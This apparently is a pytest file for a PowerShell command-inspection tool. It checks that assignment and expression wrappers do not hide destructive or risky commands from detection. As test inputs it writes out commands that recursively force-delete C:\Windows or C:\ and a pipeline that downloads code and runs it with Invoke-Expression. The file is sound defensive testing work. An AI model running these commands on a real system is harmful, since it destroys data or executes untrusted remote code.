"""Assignment and expression wrappers must not hide executable pipelines."""
import pytest

from command_inspector import Analyzer
from command_inspector.local_evidence import DisabledEvidenceProvider


def analyze(source):
    return Analyzer(evidence=DisabledEvidenceProvider()).analyze(
        source, r'D:\work', shell='powershell')


@pytest.mark.parametrize('source', [
    r'$x = Remove-Item C:\Windows -Recurse -Force',
    r'if ($x = Remove-Item -Recurse -Force C:\) {}',
    r'$obj.Property = Remove-Item C:\Windows -Recurse -Force',
    r'$items[0] = Remove-Item C:\Windows -Recurse -Force',
    r'$HOME = Remove-Item C:\Windows -Recurse -Force',
    r'$x += Remove-Item C:\Windows -Recurse -Force',
    r'$x = $y = Remove-Item C:\Windows -Recurse -Force',
    r'$x = (Remove-Item C:\Windows -Recurse -Force)',
    r'$x = $(Remove-Item C:\Windows -Recurse -Force)',
    r'Write-Output (Remove-Item C:\Windows -Recurse -Force)',
    r'"x" -f ((Remove-Item C:\Windows -Recurse -Force).Length/1GB)',
    r'Get-ChildItem | ForEach-Object { [pscustomobject]@{ a=1; b=(Remove-Item C:\Windows -Recurse -Force); c=3 } }',
])
def test_expression_effect_is_reported_once(source):
    assert not Analyzer().parse(source, shell='powershell').diagnostics
    findings = analyze(source)['findings']
    matching = [f for f in findings if f['rule'] == 'delete-protected-root']
    assert len(matching) == 1
    assert matching[0]['level'] == 'BLOCK'


def test_assignment_in_try_retains_network_request():
    result = analyze("try { $r = Invoke-WebRequest -Uri 'https://example.com/data' } catch {}")
    assert sum(f['rule'] == 'network-request' for f in result['findings']) == 1


def test_assignment_preserves_pipeline_execution_routing():
    result = analyze('$r = Invoke-WebRequest https://example.com/code | Invoke-Expression')
    rules = {f['rule'] for f in result['findings']}
    assert 'execution-content-unavailable' in rules
    assert 'download-content' in rules
    assert 'network-request' not in rules
    standalone = analyze('Invoke-WebRequest https://example.com/code | Invoke-Expression')
    assert result == standalone


@pytest.mark.parametrize('source', [
    'ForEach-Object { [pscustomobject]@{ a=1; b=2; c=3 } }',
    'Get-ChildItem | ForEach-Object { [pscustomobject]@{ a=1; b=2; c=3 } }',
    '"x" -f ((Get-PSDrive D).Free/1GB)',
    '$x = "x" -f ((Get-PSDrive D).Free/1GB)',
])
def test_structural_examples_parse_and_keep_nested_commands(source):
    assert not Analyzer().parse(source, shell='powershell').diagnostics
    result = analyze(source)
    unknown = [f['data']['command'] for f in result.get('findings', []) if f['rule'] == 'unknown-command']
    assert unknown == (['get-psdrive'] if 'Get-PSDrive' in source else [])


def test_get_date_arguments_still_inspect_effects():
    result = analyze(r'$date = Get-Date -Date (Remove-Item C:\Windows -Recurse -Force)')
    assert any(f['rule'] == 'delete-protected-root' for f in result['findings'])
